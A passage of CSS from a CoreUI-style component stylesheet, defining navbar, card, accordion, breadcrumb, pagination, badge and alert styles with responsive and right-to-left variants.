                flex-wrap: wrap;
                align-items: center;
                justify-content: space-between;
                padding: var(--cui-navbar-padding-y) var(--cui-navbar-padding-x);
            }
            .navbar .header > .container,
            .navbar .header > .container-fluid,
            .navbar .header > .container-sm,
            .navbar .header > .container-md,
            .navbar .header > .container-lg,
            .navbar .header > .container-xl,
            .navbar .header > .container-xxl,
            .navbar > .container,
            .navbar > .container-fluid,
            .navbar > .container-sm,
            .navbar > .container-md,
            .navbar > .container-lg,
            .navbar > .container-xl,
            .navbar > .container-xxl {
                display: flex;
                flex-wrap: inherit;
                align-items: center;
                justify-content: space-between;
            }
            .navbar-brand {
                padding-top: var(--cui-navbar-brand-padding-y);
                padding-bottom: var(--cui-navbar-brand-padding-y);
                font-size: var(--cui-navbar-brand-font-size);
                color: var(--cui-navbar-brand-color);
                text-decoration: none;
                white-space: nowrap;
            }
            html:not([dir="rtl"]) .navbar-brand {
                margin-right: var(--cui-navbar-brand-margin-end);
            }
            *[dir="rtl"] .navbar-brand {
                margin-left: var(--cui-navbar-brand-margin-end);
            }
            .navbar-brand:hover,
            .navbar-brand:focus {
                color: var(--cui-navbar-brand-hover-color);
            }
            .navbar-nav {
                --cui-nav-link-padding-x: 0;
                --cui-nav-link-padding-y: 0.5rem;
                --cui-nav-link-color: var(--cui-navbar-color);
                --cui-nav-link-hover-color: var(--cui-navbar-hover-color);
                --cui-nav-link-disabled-color: var(--cui-navbar-disabled-color);
                display: flex;
                flex-direction: column;
                margin-bottom: 0;
                list-style: none;
            }
            html:not([dir="rtl"]) .navbar-nav {
                padding-left: 0;
            }
            *[dir="rtl"] .navbar-nav {
                padding-right: 0;
            }
            .navbar-nav .show > .nav-link,
            .navbar-nav .nav-link.active {
                color: var(--cui-navbar-active-color);
            }
            .navbar-nav .dropdown-menu {
                position: static;
            }
            .navbar-text {
                padding-top: 0.5rem;
                padding-bottom: 0.5rem;
                color: var(--cui-navbar-color);
            }
            .navbar-text a,
            .navbar-text a:hover,
            .navbar-text a:focus {
                color: var(--cui-navbar-active-color);
            }
            .navbar-collapse {
                flex-basis: 100%;
                flex-grow: 1;
                align-items: center;
            }
            .navbar-toggler {
                padding: var(--cui-navbar-toggler-padding-y) var(--cui-navbar-toggler-padding-x);
                font-size: var(--cui-navbar-toggler-font-size);
                line-height: 1;
                color: var(--cui-navbar-color);
                background-color: transparent;
                border: var(--cui-border-width) solid var(--cui-navbar-toggler-border-color);
                border-radius: var(--cui-navbar-toggler-border-radius);
                transition: var(--cui-navbar-toggler-transition);
            }
            @media (prefers-reduced-motion: reduce) {
                .navbar-toggler {
                    transition: none;
                }
            }
            .navbar-toggler:hover {
                text-decoration: none;
            }
            .navbar-toggler:focus {
                text-decoration: none;
                outline: 0;
                box-shadow: 0 0 0 var(--cui-navbar-toggler-focus-width);
            }
            .navbar-toggler-icon {
                display: inline-block;
                width: 1.5em;
                height: 1.5em;
                vertical-align: middle;
                background-image: var(--cui-navbar-toggler-icon-bg);
                background-repeat: no-repeat;
                background-position: center;
                background-size: 100%;
            }
            .navbar-nav-scroll {
                max-height: var(--cui-scroll-height, 75vh);
                overflow-y: auto;
            }
            @media (min-width: 576px) {
                .navbar-expand-sm {
                    flex-wrap: nowrap;
                    justify-content: flex-start;
                }
                .navbar-expand-sm .navbar-nav {
                    flex-direction: row;
                }
                .navbar-expand-sm .navbar-nav .dropdown-menu {
                    position: absolute;
                }
                .navbar-expand-sm .navbar-nav .nav-link {
                    padding-right: var(--cui-navbar-nav-link-padding-x);
                    padding-left: var(--cui-navbar-nav-link-padding-x);
                }
                .navbar-expand-sm .navbar-nav-scroll {
                    overflow: visible;
                }
                .navbar-expand-sm .navbar-collapse {
                    display: flex !important;
                    flex-basis: auto;
                }
                .navbar-expand-sm .navbar-toggler {
                    display: none;
                }
                .navbar-expand-sm .offcanvas {
                    position: static;
                    z-index: auto;
                    flex-grow: 1;
                    width: auto !important;
                    height: auto !important;
                    visibility: visible !important;
                    background-color: transparent !important;
                    border: 0 !important;
                    transform: none !important;
                    transition: none;
                }
                .navbar-expand-sm .offcanvas .offcanvas-header {
                    display: none;
                }
                .navbar-expand-sm .offcanvas .offcanvas-body {
                    display: flex;
                    flex-grow: 0;
                    padding: 0;
                    overflow-y: visible;
                }
            }
            @media (min-width: 768px) {
                .navbar-expand-md {
                    flex-wrap: nowrap;
                    justify-content: flex-start;
                }
                .navbar-expand-md .navbar-nav {
                    flex-direction: row;
                }
                .navbar-expand-md .navbar-nav .dropdown-menu {
                    position: absolute;
                }
                .navbar-expand-md .navbar-nav .nav-link {
                    padding-right: var(--cui-navbar-nav-link-padding-x);
                    padding-left: var(--cui-navbar-nav-link-padding-x);
                }
                .navbar-expand-md .navbar-nav-scroll {
                    overflow: visible;
                }
                .navbar-expand-md .navbar-collapse {
                    display: flex !important;
                    flex-basis: auto;
                }
                .navbar-expand-md .navbar-toggler {
                    display: none;
                }
                .navbar-expand-md .offcanvas {
                    position: static;
                    z-index: auto;
                    flex-grow: 1;
                    width: auto !important;
                    height: auto !important;
                    visibility: visible !important;
                    background-color: transparent !important;
                    border: 0 !important;
                    transform: none !important;
                    transition: none;
                }
                .navbar-expand-md .offcanvas .offcanvas-header {
                    display: none;
                }
                .navbar-expand-md .offcanvas .offcanvas-body {
                    display: flex;
                    flex-grow: 0;
                    padding: 0;
                    overflow-y: visible;
                }
            }
            @media (min-width: 992px) {
                .navbar-expand-lg {
                    flex-wrap: nowrap;
                    justify-content: flex-start;
                }
                .navbar-expand-lg .navbar-nav {
                    flex-direction: row;
                }
                .navbar-expand-lg .navbar-nav .dropdown-menu {
                    position: absolute;
                }
                .navbar-expand-lg .navbar-nav .nav-link {
                    padding-right: var(--cui-navbar-nav-link-padding-x);
                    padding-left: var(--cui-navbar-nav-link-padding-x);
                }
                .navbar-expand-lg .navbar-nav-scroll {
                    overflow: visible;
                }
                .navbar-expand-lg .navbar-collapse {
                    display: flex !important;
                    flex-basis: auto;
                }
                .navbar-expand-lg .navbar-toggler {
                    display: none;
                }
                .navbar-expand-lg .offcanvas {
                    position: static;
                    z-index: auto;
                    flex-grow: 1;
                    width: auto !important;
                    height: auto !important;
                    visibility: visible !important;
                    background-color: transparent !important;
                    border: 0 !important;
                    transform: none !important;
                    transition: none;
                }
                .navbar-expand-lg .offcanvas .offcanvas-header {
                    display: none;
                }
                .navbar-expand-lg .offcanvas .offcanvas-body {
                    display: flex;
                    flex-grow: 0;
                    padding: 0;
                    overflow-y: visible;
                }
            }
            @media (min-width: 1200px) {
                .navbar-expand-xl {
                    flex-wrap: nowrap;
                    justify-content: flex-start;
                }
                .navbar-expand-xl .navbar-nav {
                    flex-direction: row;
                }
                .navbar-expand-xl .navbar-nav .dropdown-menu {
                    position: absolute;
                }
                .navbar-expand-xl .navbar-nav .nav-link {
                    padding-right: var(--cui-navbar-nav-link-padding-x);
                    padding-left: var(--cui-navbar-nav-link-padding-x);
                }
                .navbar-expand-xl .navbar-nav-scroll {
                    overflow: visible;
                }
                .navbar-expand-xl .navbar-collapse {
                    display: flex !important;
                    flex-basis: auto;
                }
                .navbar-expand-xl .navbar-toggler {
                    display: none;
                }
                .navbar-expand-xl .offcanvas {
                    position: static;
                    z-index: auto;
                    flex-grow: 1;
                    width: auto !important;
                    height: auto !important;
                    visibility: visible !important;
                    background-color: transparent !important;
                    border: 0 !important;
                    transform: none !important;
                    transition: none;
                }
                .navbar-expand-xl .offcanvas .offcanvas-header {
                    display: none;
                }
                .navbar-expand-xl .offcanvas .offcanvas-body {
                    display: flex;
                    flex-grow: 0;
                    padding: 0;
                    overflow-y: visible;
                }
            }
            @media (min-width: 1400px) {
                .navbar-expand-xxl {
                    flex-wrap: nowrap;
                    justify-content: flex-start;
                }
                .navbar-expand-xxl .navbar-nav {
                    flex-direction: row;
                }
                .navbar-expand-xxl .navbar-nav .dropdown-menu {
                    position: absolute;
                }
                .navbar-expand-xxl .navbar-nav .nav-link {
                    padding-right: var(--cui-navbar-nav-link-padding-x);
                    padding-left: var(--cui-navbar-nav-link-padding-x);
                }
                .navbar-expand-xxl .navbar-nav-scroll {
                    overflow: visible;
                }
                .navbar-expand-xxl .navbar-collapse {
                    display: flex !important;
                    flex-basis: auto;
                }
                .navbar-expand-xxl .navbar-toggler {
                    display: none;
                }
                .navbar-expand-xxl .offcanvas {
                    position: static;
                    z-index: auto;
                    flex-grow: 1;
                    width: auto !important;
                    height: auto !important;
                    visibility: visible !important;
                    background-color: transparent !important;
                    border: 0 !important;
                    transform: none !important;
                    transition: none;
                }
                .navbar-expand-xxl .offcanvas .offcanvas-header {
                    display: none;
                }
                .navbar-expand-xxl .offcanvas .offcanvas-body {
                    display: flex;
                    flex-grow: 0;
                    padding: 0;
                    overflow-y: visible;
                }
            }
            .navbar-expand {
                flex-wrap: nowrap;
                justify-content: flex-start;
            }
            .navbar-expand .navbar-nav {
                flex-direction: row;
            }
            .navbar-expand .navbar-nav .dropdown-menu {
                position: absolute;
            }
            .navbar-expand .navbar-nav .nav-link {
                padding-right: var(--cui-navbar-nav-link-padding-x);
                padding-left: var(--cui-navbar-nav-link-padding-x);
            }
            .navbar-expand .navbar-nav-scroll {
                overflow: visible;
            }
            .navbar-expand .navbar-collapse {
                display: flex !important;
                flex-basis: auto;
            }
            .navbar-expand .navbar-toggler {
                display: none;
            }
            .navbar-expand .offcanvas {
                position: static;
                z-index: auto;
                flex-grow: 1;
                width: auto !important;
                height: auto !important;
                visibility: visible !important;
                background-color: transparent !important;
                border: 0 !important;
                transform: none !important;
                transition: none;
            }
            .navbar-expand .offcanvas .offcanvas-header {
                display: none;
            }
            .navbar-expand .offcanvas .offcanvas-body {
                display: flex;
                flex-grow: 0;
                padding: 0;
                overflow-y: visible;
            }
            .navbar-dark {
                --cui-navbar-color: rgba(255, 255, 255, 0.6);
                --cui-navbar-hover-color: rgba(255, 255, 255, 0.87);
                --cui-navbar-disabled-color: rgba(255, 255, 255, 0.38);
                --cui-navbar-active-color: rgba(255, 255, 255, 0.87);
                --cui-navbar-brand-color: rgba(255, 255, 255, 0.87);
                --cui-navbar-brand-hover-color: rgba(255, 255, 255, 0.87);
                --cui-navbar-toggler-border-color: rgba(255, 255, 255, 0.1);
                --cui-navbar-toggler-icon-bg: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3e%3cpath stroke='rgba%28255, 255, 255, 0.6%29' stroke-linecap='round' stroke-miterlimit='10' stroke-width='2' d='M4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e");
            }
            .card {
                --cui-card-spacer-y: 1rem;
                --cui-card-spacer-x: 1rem;
                --cui-card-title-spacer-y: 0.5rem;
                --cui-card-border-width: 1px;
                --cui-card-border-color: var(--cui-border-color-translucent);
                --cui-card-border-radius: 0.375rem;
                --cui-card-box-shadow: ;
                --cui-card-inner-border-radius: calc(0.375rem - 1px);
                --cui-card-cap-padding-y: 0.5rem;
                --cui-card-cap-padding-x: 1rem;
                --cui-card-cap-bg: rgba(0, 0, 21, 0.03);
                --cui-card-cap-color: unset;
                --cui-card-height: ;
                --cui-card-color: unset;
                --cui-card-bg: #fff;
                --cui-card-img-overlay-padding: 1rem;
                --cui-card-group-margin: 0.75rem;
                position: relative;
                display: flex;
                flex-direction: column;
                min-width: 0;
                height: var(--cui-card-height);
                word-wrap: break-word;
                background-color: var(--cui-card-bg);
                background-clip: border-box;
                border: var(--cui-card-border-width) solid var(--cui-card-border-color);
                border-radius: var(--cui-card-border-radius);
                box-shadow: 0 1px 1px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 2px 1px -1px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12), 0 1px 3px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2);
            }
            .card:not([class*="border"]) {
                border: 0;
            }
            .card > hr {
                margin-right: 0;
                margin-left: 0;
            }
            .card > .list-group {
                border-top: inherit;
                border-bottom: inherit;
            }
            .card > .list-group:first-child {
                border-top-width: 0;
                border-top-left-radius: var(--cui-card-inner-border-radius);
                border-top-right-radius: var(--cui-card-inner-border-radius);
            }
            .card > .list-group:last-child {
                border-bottom-width: 0;
                border-bottom-right-radius: var(--cui-card-inner-border-radius);
                border-bottom-left-radius: var(--cui-card-inner-border-radius);
            }
            .card > .card-header + .list-group,
            .card > .list-group + .card-footer {
                border-top: 0;
            }
            .card-body {
                flex: 1 1 auto;
                padding: var(--cui-card-spacer-y) var(--cui-card-spacer-x);
                color: var(--cui-card-color);
            }
            .card-title {
                margin-bottom: var(--cui-card-title-spacer-y);
            }
            .card-subtitle {
                margin-top: calc(-0.5 * var(--cui-card-title-spacer-y));
                margin-bottom: 0;
            }
            .card-text:last-child {
                margin-bottom: 0;
            }
            html:not([dir="rtl"]) .card-link + .card-link {
                margin-left: var(--cui-card-spacer-x);
            }
            *[dir="rtl"] .card-link + .card-link {
                margin-right: var(--cui-card-spacer-x);
            }
            .card-header {
                padding: var(--cui-card-cap-padding-y) var(--cui-card-cap-padding-x);
                margin-bottom: 0;
                color: var(--cui-card-cap-color);
                background-color: var(--cui-card-cap-bg);
                border-bottom: var(--cui-card-border-width) solid var(--cui-card-border-color);
            }
            .card-header:first-child {
                border-radius: var(--cui-card-inner-border-radius) var(--cui-card-inner-border-radius) 0 0;
            }
            .card-footer {
                padding: var(--cui-card-cap-padding-y) var(--cui-card-cap-padding-x);
                color: var(--cui-card-cap-color);
                background-color: var(--cui-card-cap-bg);
                border-top: var(--cui-card-border-width) solid var(--cui-card-border-color);
            }
            .card-footer:last-child {
                border-radius: 0 0 var(--cui-card-inner-border-radius) var(--cui-card-inner-border-radius);
            }
            .card-header-tabs {
                margin-right: calc(-0.5 * var(--cui-card-cap-padding-x));
                margin-bottom: calc(-1 * var(--cui-card-cap-padding-y));
                margin-left: calc(-0.5 * var(--cui-card-cap-padding-x));
                border-bottom: 0;
            }
            .card-header-tabs .nav-link.active {
                background-color: var(--cui-card-bg);
                border-bottom-color: var(--cui-card-bg);
            }
            .card-header-pills {
                margin-right: calc(-0.5 * var(--cui-card-cap-padding-x));
                margin-left: calc(-0.5 * var(--cui-card-cap-padding-x));
            }
            .card-img-overlay {
                position: absolute;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                padding: var(--cui-card-img-overlay-padding);
                border-radius: var(--cui-card-inner-border-radius);
            }
            .card-img,
            .card-img-top,
            .card-img-bottom {
                width: 100%;
            }
            .card-img,
            .card-img-top {
                border-top-left-radius: var(--cui-card-inner-border-radius);
                border-top-right-radius: var(--cui-card-inner-border-radius);
            }
            .card-img,
            .card-img-bottom {
                border-bottom-right-radius: var(--cui-card-inner-border-radius);
                border-bottom-left-radius: var(--cui-card-inner-border-radius);
            }
            .card-group > .card {
                margin-bottom: var(--cui-card-group-margin);
            }
            @media (min-width: 576px) {
                .card-group {
                    display: flex;
                    flex-flow: row wrap;
                }
                .card-group > .card {
                    flex: 1 0 0%;
                    margin-bottom: 0;
                }
                html:not([dir="rtl"]) .card-group > .card + .card {
                    margin-left: 0;
                    border-left: 0;
                }
                *[dir="rtl"] .card-group > .card + .card {
                    margin-right: 0;
                    border-right: 0;
                }
                html:not([dir="rtl"]) .card-group > .card:not(:last-child) {
                    border-top-right-radius: 0;
                    border-bottom-right-radius: 0;
                }
                *[dir="rtl"] .card-group > .card:not(:last-child) {
                    border-top-left-radius: 0;
                    border-bottom-left-radius: 0;
                }
                .card-group > .card:not(:last-child) .card-img-top,
                .card-group > .card:not(:last-child) .card-header {
                    border-top-right-radius: 0;
                }
                .card-group > .card:not(:last-child) .card-img-bottom,
                .card-group > .card:not(:last-child) .card-footer {
                    border-bottom-right-radius: 0;
                }
                html:not([dir="rtl"]) .card-group > .card:not(:first-child) {
                    border-top-left-radius: 0;
                    border-bottom-left-radius: 0;
                }
                *[dir="rtl"] .card-group > .card:not(:first-child) {
                    border-top-right-radius: 0;
                    border-bottom-right-radius: 0;
                }
                .card-group > .card:not(:first-child) .card-img-top,
                .card-group > .card:not(:first-child) .card-header {
                    border-top-left-radius: 0;
                }
                .card-group > .card:not(:first-child) .card-img-bottom,
                .card-group > .card:not(:first-child) .card-footer {
                    border-bottom-left-radius: 0;
                }
            }
            .accordion {
                --cui-accordion-color: rgba(44, 56, 74, 0.95);
                --cui-accordion-bg: #fff;
                --cui-accordion-transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out, border-radius 0.15s ease;
                --cui-accordion-border-color: var(--cui-border-color);
                --cui-accordion-border-width: 1px;
                --cui-accordion-border-radius: 0.375rem;
                --cui-accordion-inner-border-radius: calc(0.375rem - 1px);
                --cui-accordion-btn-padding-x: 1.25rem;
                --cui-accordion-btn-padding-y: 1rem;
                --cui-accordion-btn-color: rgba(44, 56, 74, 0.95);
                --cui-accordion-btn-color: rgba(44, 56, 74, 0.95);
                --cui-accordion-btn-bg: var(--cui-accordion-bg);
                --cui-accordion-btn-icon: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba%2844, 56, 74, 0.95%29'%3e%3cpath fill-rule='evenodd' d='M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z'/%3e%3c/svg%3e");
                --cui-accordion-btn-icon-width: 1.25rem;
                --cui-accordion-btn-icon-transform: rotate(-180deg);
                --cui-accordion-btn-icon-transition: transform 0.2s ease-in-out;
                --cui-accordion-btn-active-icon: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='%232d1cc5'%3e%3cpath fill-rule='evenodd' d='M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z'/%3e%3c/svg%3e");
                --cui-accordion-btn-focus-border-color: #998fed;
                --cui-accordion-btn-focus-box-shadow: 0 0 0 0.25rem rgba(50, 31, 219, 0.25);
                --cui-accordion-body-padding-x: 1.25rem;
                --cui-accordion-body-padding-y: 1rem;
                --cui-accordion-active-color: #2d1cc5;
                --cui-accordion-active-bg: #ebe9fb;
            }
            .accordion-button {
                position: relative;
                display: flex;
                align-items: center;
                width: 100%;
                padding: var(--cui-accordion-btn-padding-y) var(--cui-accordion-btn-padding-x);
                font-size: 1rem;
                color: var(--cui-accordion-btn-color);
                text-align: left;
                background-color: var(--cui-accordion-btn-bg);
                border: 0;
                border-radius: 0;
                overflow-anchor: none;
                transition: var(--cui-accordion-transition);
            }
            @media (prefers-reduced-motion: reduce) {
                .accordion-button {
                    transition: none;
                }
            }
            .accordion-button:not(.collapsed) {
                color: var(--cui-accordion-active-color);
                background-color: var(--cui-accordion-active-bg);
                box-shadow: inset 0 calc(-1 * var(--cui-accordion-border-width)) 0 var(--cui-accordion-border-color);
            }
            .accordion-button:not(.collapsed)::after {
                background-image: var(--cui-accordion-btn-active-icon);
                transform: var(--cui-accordion-btn-icon-transform);
            }
            .accordion-button::after {
                flex-shrink: 0;
                width: var(--cui-accordion-btn-icon-width);
                height: var(--cui-accordion-btn-icon-width);
                margin-left: auto;
                content: "";
                background-image: var(--cui-accordion-btn-icon);
                background-repeat: no-repeat;
                background-size: var(--cui-accordion-btn-icon-width);
                transition: var(--cui-accordion-btn-icon-transition);
            }
            @media (prefers-reduced-motion: reduce) {
                .accordion-button::after {
                    transition: none;
                }
            }
            .accordion-button:hover {
                z-index: 2;
            }
            .accordion-button:focus {
                z-index: 3;
                border-color: var(--cui-accordion-btn-focus-border-color);
                outline: 0;
                box-shadow: var(--cui-accordion-btn-focus-box-shadow);
            }
            .accordion-header {
                margin-bottom: 0;
            }
            .accordion-item {
                color: var(--cui-accordion-color);
                background-color: var(--cui-accordion-bg);
                border: var(--cui-accordion-border-width) solid var(--cui-accordion-border-color);
            }
            .accordion-item:first-of-type {
                border-top-left-radius: var(--cui-accordion-border-radius);
                border-top-right-radius: var(--cui-accordion-border-radius);
            }
            .accordion-item:first-of-type .accordion-button {
                border-top-left-radius: var(--cui-accordion-inner-border-radius);
                border-top-right-radius: var(--cui-accordion-inner-border-radius);
            }
            .accordion-item:not(:first-of-type) {
                border-top: 0;
            }
            .accordion-item:last-of-type {
                border-bottom-right-radius: var(--cui-accordion-border-radius);
                border-bottom-left-radius: var(--cui-accordion-border-radius);
            }
            .accordion-item:last-of-type .accordion-button.collapsed {
                border-bottom-right-radius: var(--cui-accordion-inner-border-radius);
                border-bottom-left-radius: var(--cui-accordion-inner-border-radius);
            }
            .accordion-item:last-of-type .accordion-collapse {
                border-bottom-right-radius: var(--cui-accordion-border-radius);
                border-bottom-left-radius: var(--cui-accordion-border-radius);
            }
            .accordion-body {
                padding: var(--cui-accordion-body-padding-y) var(--cui-accordion-body-padding-x);
            }
            .accordion-flush .accordion-collapse {
                border-width: 0;
            }
            .accordion-flush .accordion-item {
                border-right: 0;
                border-left: 0;
                border-radius: 0;
            }
            .accordion-flush .accordion-item:first-child {
                border-top: 0;
            }
            .accordion-flush .accordion-item:last-child {
                border-bottom: 0;
            }
            .accordion-flush .accordion-item .accordion-button,
            .accordion-flush .accordion-item .accordion-button.collapsed {
                border-radius: 0;
            }
            .breadcrumb {
                --cui-breadcrumb-padding-x: 0;
                --cui-breadcrumb-padding-y: 0;
                --cui-breadcrumb-margin-bottom: 1rem;
                --cui-breadcrumb-bg: unset;
                --cui-breadcrumb-border-radius: ;
                --cui-breadcrumb-divider-color: #8a93a2;
                --cui-breadcrumb-item-padding-x: 0.5rem;
                --cui-breadcrumb-item-active-color: #8a93a2;
                display: flex;
                flex-wrap: wrap;
                padding: var(--cui-breadcrumb-padding-y) var(--cui-breadcrumb-padding-x);
                margin-bottom: var(--cui-breadcrumb-margin-bottom);
                font-size: var(--cui-breadcrumb-font-size);
                list-style: none;
                background-color: var(--cui-breadcrumb-bg);
                border-radius: var(--cui-breadcrumb-border-radius);
            }
            html:not([dir="rtl"]) .breadcrumb-item + .breadcrumb-item {
                padding-left: var(--cui-breadcrumb-item-padding-x);
            }
            *[dir="rtl"] .breadcrumb-item + .breadcrumb-item {
                padding-right: var(--cui-breadcrumb-item-padding-x);
            }
            .breadcrumb-item + .breadcrumb-item::before {
                color: var(--cui-breadcrumb-divider-color);
            }
            html:not([dir="rtl"]) .breadcrumb-item + .breadcrumb-item::before {
                float: left;
                padding-right: var(--cui-breadcrumb-item-padding-x);
                content: var(--cui-breadcrumb-divider, "/");
            }
            *[dir="rtl"] .breadcrumb-item + .breadcrumb-item::before {
                float: right;
                padding-left: var(--cui-breadcrumb-item-padding-x);
                content: var(--cui-breadcrumb-divider-flipped, "/");
            }
            .breadcrumb-item.active {
                color: var(--cui-breadcrumb-item-active-color);
            }
            .pagination {
                --cui-pagination-padding-x: 0.75rem;
                --cui-pagination-padding-y: 0.375rem;
                --cui-pagination-font-size: 1rem;
                --cui-pagination-color: var(--cui-link-color);
                --cui-pagination-bg: #fff;
                --cui-pagination-border-width: 1px;
                --cui-pagination-border-color: #c4c9d0;
                --cui-pagination-border-radius: 0.375rem;
                --cui-pagination-hover-color: var(--cui-link-hover-color);
                --cui-pagination-hover-bg: #d8dbe0;
                --cui-pagination-hover-border-color: #c4c9d0;
                --cui-pagination-focus-color: var(--cui-link-hover-color);
                --cui-pagination-focus-bg: #d8dbe0;
                --cui-pagination-focus-box-shadow: 0 0 0 0.25rem rgba(50, 31, 219, 0.25);
                --cui-pagination-active-color: rgba(255, 255, 255, 0.87);
                --cui-pagination-active-bg: #321fdb;
                --cui-pagination-active-border-color: #321fdb;
                --cui-pagination-disabled-color: #8a93a2;
                --cui-pagination-disabled-bg: #fff;
                --cui-pagination-disabled-border-color: #c4c9d0;
                display: flex;
                list-style: none;
            }
            html:not([dir="rtl"]) .pagination {
                padding-left: 0;
            }
            *[dir="rtl"] .pagination {
                padding-right: 0;
            }
            .page-link {
                position: relative;
                display: block;
                padding: var(--cui-pagination-padding-y) var(--cui-pagination-padding-x);
                font-size: var(--cui-pagination-font-size);
                color: var(--cui-pagination-color);
                text-decoration: none;
                background-color: var(--cui-pagination-bg);
                border: var(--cui-pagination-border-width) solid var(--cui-pagination-border-color);
                transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
            }
            @media (prefers-reduced-motion: reduce) {
                .page-link {
                    transition: none;
                }
            }
            .page-link:hover {
                z-index: 2;
                color: var(--cui-pagination-hover-color);
                background-color: var(--cui-pagination-hover-bg);
                border-color: var(--cui-pagination-hover-border-color);
            }
            .page-link:focus {
                z-index: 3;
                color: var(--cui-pagination-focus-color);
                background-color: var(--cui-pagination-focus-bg);
                outline: 0;
                box-shadow: var(--cui-pagination-focus-box-shadow);
            }
            .page-link.active,
            .active > .page-link {
                z-index: 3;
                color: var(--cui-pagination-active-color);
                background-color: var(--cui-pagination-active-bg);
                border-color: var(--cui-pagination-active-border-color);
            }
            .page-link.disabled,
            .disabled > .page-link {
                color: var(--cui-pagination-disabled-color);
                pointer-events: none;
                background-color: var(--cui-pagination-disabled-bg);
                border-color: var(--cui-pagination-disabled-border-color);
            }
            html:not([dir="rtl"]) .page-item:not(:first-child) .page-link {
                margin-left: -1px;
            }
            *[dir="rtl"] .page-item:not(:first-child) .page-link {
                margin-right: -1px;
            }
            html:not([dir="rtl"]) .page-item:first-child .page-link {
                border-top-left-radius: var(--cui-pagination-border-radius);
                border-bottom-left-radius: var(--cui-pagination-border-radius);
            }
            *[dir="rtl"] .page-item:first-child .page-link {
                border-top-right-radius: var(--cui-pagination-border-radius);
                border-bottom-right-radius: var(--cui-pagination-border-radius);
            }
            html:not([dir="rtl"]) .page-item:last-child .page-link {
                border-top-right-radius: var(--cui-pagination-border-radius);
                border-bottom-right-radius: var(--cui-pagination-border-radius);
            }
            *[dir="rtl"] .page-item:last-child .page-link {
                border-top-left-radius: var(--cui-pagination-border-radius);
                border-bottom-left-radius: var(--cui-pagination-border-radius);
            }
            .pagination-lg {
                --cui-pagination-padding-x: 1.5rem;
                --cui-pagination-padding-y: 0.75rem;
                --cui-pagination-font-size: 1.25rem;
                --cui-pagination-border-radius: 0.5rem;
            }
            .pagination-sm {
                --cui-pagination-padding-x: 0.5rem;
                --cui-pagination-padding-y: 0.25rem;
                --cui-pagination-font-size: 0.875rem;
                --cui-pagination-border-radius: 0.25rem;
            }
            .badge {
                --cui-badge-padding-x: 0.65em;
                --cui-badge-padding-y: 0.35em;
                --cui-badge-font-size: 0.75em;
                --cui-badge-font-weight: 700;
                --cui-badge-color: rgba(255, 255, 255, 0.87);
                --cui-badge-border-radius: 0.375rem;
                display: inline-block;
                padding: var(--cui-badge-padding-y) var(--cui-badge-padding-x);
                font-size: var(--cui-badge-font-size);
                font-weight: var(--cui-badge-font-weight);
                line-height: 1;
                color: var(--cui-badge-color);
                text-align: center;
                white-space: nowrap;
                vertical-align: baseline;
                border-radius: var(--cui-badge-border-radius, 0);
            }
            .badge:empty {
                display: none;
            }
            .btn .badge {
                position: relative;
                top: -1px;
            }
            .badge-sm {
                padding: 0.3em 0.5em;
                font-size: 0.65em;
            }
            .alert {
                --cui-alert-bg: transparent;
                --cui-alert-padding-x: 1rem;
                --cui-alert-padding-y: 1rem;
                --cui-alert-margin-bottom: 1rem;
                --cui-alert-color: inherit;
                --cui-alert-border-color: transparent;
                --cui-alert-border: 1px solid var(--cui-alert-border-color);
                --cui-alert-border-radius: 0.375rem;
                position: relative;
                padding: var(--cui-alert-padding-y) var(--cui-alert-padding-x);
                margin-bottom: var(--cui-alert-margin-bottom);
                color: var(--cui-alert-color);
                background-color: var(--cui-alert-bg);
                border: var(--cui-alert-border);
                border-radius: var(--cui-alert-border-radius);
            }
            .alert-heading {
                color: inherit;
            }
            .alert-link {
                font-weight: 700;
                color: var(--cui-alert-link-color);
            }
            html:not([dir="rtl"]) .alert-dismissible {
                padding-right: 3rem;
            }
            *[dir="rtl"] .alert-dismissible {
                padding-left: 3rem;
            }
            .alert-dismissible .btn-close {
                position: absolute;
                top: 0;
                z-index: 2;
                padding: 1.25rem 1rem;
            }
            html:not([dir="rtl"]) .alert-dismissible .btn-close {
                right: 0;
            }
            *[dir="rtl"] .alert-dismissible .btn-close {
                left: 0;
            }
            .alert-primary {
                --cui-alert-color: #1e1383;
                --cui-alert-bg: #d6d2f8;
                --cui-alert-border-color: #c2bcf4;
            }
            .alert-primary .alert-link {
                color: #180f69;
            }
            .alert-secondary {
                --cui-alert-color: #5e636a;
                --cui-alert-bg: #ebedef;
                --cui-alert-border-color: #e2e4e8;
            }
            .alert-secondary .alert-link {
                color: #4b4f55;
            }
            .alert-success {
                --cui-alert-color: #1c6e37;
                --cui-alert-bg: #d5f1de;
                --cui-alert-border-color: #c0eace;
            }
            .alert-success .alert-link {
                color: #16582c;
            }
            .alert-info {
                --cui-alert-color: #1f5c99;
                --cui-alert-bg: #d6ebff;
                --cui-alert-border-color: #c2e0ff;
            }
            .alert-info .alert-link {
                color: #194a7a;
            }
            .alert-warning {
                --cui-alert-color: rgba(131, 107, 52, 0.97);
                --cui-alert-bg: #feefd0;
                --cui-alert-border-color: #fde8b9;
            }
            .alert-warning .alert-link {
                color: rgba(104, 85, 41, 0.976);
            }
            .alert-danger {
                --cui-alert-color: #893232;
                --cui-alert-bg: #fadddd;
                --cui-alert-border-color: #f7cbcb;
            }
            .alert-danger .alert-link {
                color: #6e2828;
            }
            .alert-light {
                --cui-alert-color: rgba(125, 133, 144, 0.97);
                --cui-alert-bg: #fbfbfc;
